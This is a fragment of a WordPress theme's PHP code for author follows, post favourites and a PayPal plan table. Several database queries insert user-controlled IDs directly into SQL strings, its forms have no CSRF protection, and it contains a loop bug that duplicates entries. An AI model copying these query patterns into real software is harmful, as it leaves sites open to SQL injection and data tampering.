	$author_insert = ("INSERT into {$wpdb->prefix}author_followers (author_id,follower_id)value('".$author_id."','".$follower_id."')");

  $wpdb->query($author_insert);

}



function wp_authors_unfollow($author_id, $follower_id) {

    global $wpdb;	

	$author_del = ("DELETE from {$wpdb->prefix}author_followers WHERE author_id = $author_id AND follower_id = $follower_id ");

  $wpdb->query($author_del);

}



function wp_authors_follower_check($author_id, $follower_id) {

	global $wpdb;

	$results = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_followers WHERE follower_id = $follower_id AND author_id = $author_id", OBJECT );

    if(empty($results)){

		?>

		<form method="post">

			<input type="hidden" name="author_id" value="<?php echo $author_id; ?>"/>

			<input type="hidden" name="follower_id" value="<?php echo $follower_id; ?>"/>

			<input type="submit" name="follower" value="Follow" />

		</form>

		<div class="clearfix"></div>

		<?php

	}else{

		?>

		<form method="post">

			<input type="hidden" name="author_id" value="<?php echo $author_id; ?>"/>

			<input type="hidden" name="follower_id" value="<?php echo $follower_id; ?>"/>

			<input type="submit" name="unfollow" value="Unfollow" />

		</form>

		<div class="clearfix"></div>

		<?php

	}

}

function wp_authors_all_follower($author_id) {

	global $wpdb;

	$results = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_followers WHERE author_id = $author_id", OBJECT );

	$results2 = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_followers WHERE follower_id = $author_id", OBJECT );

	$followcounter = count($results);

	$followingcounter = count($results2);

	?>

	<div class="clearfix"></div>

	<div class="followers clearfix">

	<?php

	echo '<h1>Followers &nbsp;'.$followcounter.'</h1>';

	if(!empty($results)){

	$avatar = $results['0']->follower_id;

	echo '<div class="follower-avatar">';

	echo get_avatar($avatar, 70);

	echo '</div>';

	//$user_name = get_userdata($avatar);

	//echo $user_name->user_login;

	}

	?>

	</div>

	<div class="following">

	<?php

	echo '<h1>Following &nbsp;'.$followingcounter.'</h1>';

	if(!empty($results2)){

	$avatar = $results2['0']->author_id;

	echo '<div class="follower-avatar">';

	echo get_avatar($avatar, 70);

	echo '</div>';

	//$user_name = get_userdata($avatar);

	//echo $user_name->user_login;

	}

	?>

	</div>

	<?php

}

function wp_favorite_insert($author_id, $post_id) {

    global $wpdb;	

	$author_insert = ("INSERT into {$wpdb->prefix}author_favorite (author_id,post_id)value('".$author_id."','".$post_id."')");

  $wpdb->query($author_insert);

}



function wp_authors_unfavorite($author_id, $post_id) {

    global $wpdb;	

	$author_del = ("DELETE from {$wpdb->prefix}author_favorite WHERE author_id = $author_id AND post_id = $post_id ");

  $wpdb->query($author_del);

}



function wp_authors_favorite_check($author_id, $post_id) {

	global $wpdb;

	$results = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_favorite WHERE post_id = $post_id AND author_id = $author_id", OBJECT );

    if(empty($results)){

		?>

		<form method="post" class="fav-form clearfix">

			<input type="hidden" name="author_id" value="<?php echo $author_id; ?>"/>

			<input type="hidden" name="post_id" value="<?php echo $post_id; ?>"/>

			<i class="fa fa-heart favorite-i"></i>

			<input type="submit" name="favorite" value="Add to Favourite" />

		</form>

		<?php

	}else{

		$all_fav = $wpdb->get_results("SELECT `post_id` FROM $wpdb->postmeta WHERE `meta_key` ='_wp_page_template' AND `meta_value` = 'template-favorite.php' ", ARRAY_A);

		$all_fav_permalink = get_permalink($all_fav[0]['post_id']);

		echo '<div class="browse-favourite"><a href="'.$all_fav_permalink.'"><i class="fa fa-heart unfavorite-i"></i> <span>Browse Favourites</span></a></div>';

	}

}

function wp_authors_favorite_remove($author_id, $post_id) {

	global $wpdb;

	$results = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_favorite WHERE post_id = $post_id AND author_id = $author_id", OBJECT );

    if(!empty($results)){

		?>

		<form method="post">

			<input type="hidden" name="author_id" value="<?php echo $author_id; ?>"/>

			<input type="hidden" name="post_id" value="<?php echo $post_id; ?>"/>

			<input type="submit" name="unfavorite" value="" />

		</form>

		<?php

	}

}

function wp_authors_all_favorite($author_id) {

	global $wpdb;

	$postids = $wpdb->get_col( $wpdb->prepare( "SELECT post_id FROM {$wpdb->prefix}author_favorite WHERE author_id = $author_id", OBJECT ));

	foreach ($postids as $v2) {

        $postids[] = $v2;

    }

		return $postids;

}





add_action( 'after_setup_theme', 'admin_featuredPlan' );

function admin_featuredPlan() {

global $wpdb;

	$wpdb->query('CREATE TABLE IF NOT EXISTS `wpcads_paypal` (

                      `main_id` BIGINT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY ,

                      `user_id` TEXT NOT NULL ,

                      `id` TEXT NOT NULL ,

                      `name` TEXT NOT NULL ,

                      `token` TEXT NOT NULL ,

                      `price` FLOAT UNSIGNED NOT NULL ,

                      `currency` TEXT NOT NULL ,

                      `ads` TEXT ,

                      `days` TEXT NOT NULL ,

                      `date` TEXT NOT NULL ,

                      `status` TEXT NOT NULL ,

                      `used` TEXT NOT NULL ,

                      `transaction_id` TEXT NOT NULL ,

                      `firstname` TEXT NOT NULL ,

                      `lastname` TEXT NOT NULL ,

                      `email` TEXT NOT NULL ,

                      `description` TEXT NOT NULL ,

                      `summary` TEXT NOT NULL ,

                      `created` INT( 4 ) UNSIGNED NOT NULL

                      ) ENGINE = MYISAM ;');

  $price_plan_information = array(

    'id' => '1',

    'user_id' => '1',

    'name' => '',

    'token' => "",

    'price' => '',

    'currency' => "",

    'ads' => 'unlimited',

    'days' => 'unlimited',

    'date' => date("m/d/Y H:i:s"),

    'status' => "success",

    'used' => "0",

    'transaction_id' => "",

    'firstname' => "",

    'lastname' => "",

    'email' => "",

    'description' => "",

    'summary' => "",

    'created' => time()

  ); 



  $insert_format = array('%s', '%s', '%s','%s', '%f', '%s', '%d', '%d', '%s', '%s', '%d', '%s', '%s', '%s', '%s', '%s', '%s');

  $ucount = $wpdb->get_var( "SELECT COUNT(*) FROM wpcads_paypal where id=1" );

  if($ucount < 1)

  	$wpdb->insert('wpcads_paypal', $price_plan_information, $insert_format);

}